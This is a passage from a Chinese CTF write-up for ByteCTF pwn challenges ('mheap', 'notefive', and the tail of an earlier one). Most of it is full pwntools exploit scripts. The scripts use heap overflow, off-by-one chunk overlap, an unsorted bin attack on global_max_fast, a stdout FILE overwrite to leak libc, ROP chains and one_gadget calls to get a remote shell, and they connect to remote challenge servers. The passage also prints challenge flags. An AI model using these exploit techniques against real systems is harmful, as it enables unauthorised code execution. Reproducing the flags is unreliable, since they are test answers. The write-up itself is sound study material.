    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00404800</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>

    <span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>

    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">),</span> <span class="n">rop</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>


    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">)</span>
    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret_rop</span><span class="p">)</span>
    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="mi">1</span>
<span class="c1">#bytectf{2ab64f4ee279e5baf7ab7059b15e6d12}</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">pwn</span><span class="p">()</span>




<span class="sd">'''</span>
<span class="sd">0x00000000004018f4 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
<span class="sd">0x00000000004018f6 : pop r13 ; pop r14 ; pop r15 ; ret</span>
<span class="sd">0x00000000004018f8 : pop r14 ; pop r15 ; ret</span>
<span class="sd">0x00000000004018fa : pop r15 ; ret</span>
<span class="sd">0x00000000004018f3 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
<span class="sd">0x00000000004018f7 : pop rbp ; pop r14 ; pop r15 ; ret</span>
<span class="sd">0x00000000004011d9 : pop rbp ; ret</span>
<span class="sd">0x00000000004018fb : pop rdi ; ret</span>
<span class="sd">0x00000000004018f9 : pop rsi ; pop r15 ; ret</span>
<span class="sd">0x00000000004018f5 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>
<span class="sd">0x0000000000401016 : ret</span>
<span class="sd">0x0000000000401401 : ret 0x2be</span>
<span class="sd">0x0000000000401072 : ret 0x2f</span>
<span class="sd">0x00000000004012a2 : ret 0xc604</span>


<span class="sd"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span>
<span class="sd"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span>
<span class="sd"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span>
<span class="sd"> 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010</span>
<span class="sd"> 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009</span>
<span class="sd"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span>
<span class="sd"> 0006: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0009</span>
<span class="sd"> 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009</span>
<span class="sd"> 0008: 0x06 0x00 0x00 0x00050005  return ERRNO(5)</span>
<span class="sd"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span>
<span class="sd"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span>

<span class="sd">'''</span>
</pre></div>
<h3 data-content="1" id="e9fe1daf0c9fb37b548d3ba78864a7f3">mheap</h3>
<p>read函数返回值检查的bug，导致向前溢出。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'Content: '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Content: '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
    <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'tmux'</span><span class="p">,</span> <span class="s1">'split'</span><span class="p">,</span> <span class="s1">'-h'</span><span class="p">]</span>

    <span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>

    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./mheap'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./mheap'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'112.126.98.5'</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x40</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">,</span> <span class="s1">'sunichi'</span><span class="p">)</span> <span class="c1">#1</span>

    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="s1">'sunichi'</span><span class="p">)</span> <span class="c1">#2</span>

    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="s1">'sunichi!'</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="c1">#3</span>

    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">#4</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1">#5 </span>

    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="c1">#6</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">15</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x60</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4040cb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'Content: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span> <span class="c1">#7</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'a'</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1">#8</span>

    <span class="n">show</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x00\x00</span><span class="s1">'</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>

    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f322</span><span class="p">))</span>

    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'sunichi'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'cat flag'</span><span class="p">)</span>

    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="c1">#bytectf{34f7e6dd6acf03192d82f0337c8c54ba}</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">pwn</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="9ba20bf8391b2dcc7a9f744d479c7d67">notefive</h3>
<p>程序没有输出，存在off-by-one漏洞，限制了分配的chunk的大小，导致不能采用0x7f作为fastbin的size。利用off-by-one造成堆块重叠，<code>unsorted bin attack</code>修改<code>global_max_fast</code>。之后几乎所有的chunk都属于fastbin的范围内，利用stderror结构体flag字段的0xfb作为chunk的size，可在stdout附近布置好合适的size，再次fastbin attack可以完全控制stdout，泄露libc地址以及修改vtable来getshell</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rud</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'choice&gt;&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'idx: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'size: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'choice&gt;&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'idx: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">sa</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'content: '</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'choice&gt;&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'idx: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">ATTACH</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span>
<span class="n">BIN_PATH</span> <span class="o">=</span> <span class="s1">'./note_five'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BIN_PATH</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'tmux'</span><span class="p">,</span> <span class="s1">'split'</span><span class="p">,</span> <span class="s1">'-h'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">DEBUG</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">BIN_PATH</span><span class="p">)</span>
        <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
        <span class="k">if</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s1">'amd64'</span><span class="p">:</span>
            <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/i386-linux-gnu/libc.so.6'</span><span class="p">)</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'112.126.103.195'</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
        <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
    <span class="c1"># 0x555555554000</span>
    <span class="c1"># global_max_fast 0x7ffff7dd37f8</span>
    <span class="c1"># unsortedbin     0x7ffff7dd1b78</span>
    <span class="c1"># stdout          0x7ffff7dd2620</span>
    <span class="c1"># addr            0x7ffff7dd37e8</span>
    <span class="c1"># free_hook       0x7ffff7dd37a8</span>
    <span class="c1"># malloc_hook     0x7ffff7dd1b10</span>
    <span class="c1"># IO_list_all     0x7ffff7dd2520</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>

    <span class="c1"># overlap</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0xf0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x300</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">)</span> <span class="c1">#0</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span><span class="c1">#0 overlap 1</span>


    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\xe8\x37\n</span><span class="s1">'</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x1f0</span><span class="p">)</span> <span class="c1">#3=2</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0xe0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf1</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x3b\x25\n</span><span class="s1">'</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="p">(</span><span class="mh">0xe0</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x10\x26\n</span><span class="s1">'</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00\n</span><span class="s1">'</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">ru</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'</span><span class="se">\x00\x18\xad\xfb</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">rn</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">28</span><span class="p">)</span>
    <span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">rn</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'libc addr: '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span><span class="o">-</span><span class="p">(</span><span class="mh">0x7ffff7dd2600</span><span class="o">-</span><span class="mh">0x7ffff7a0d000</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'libc base: '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
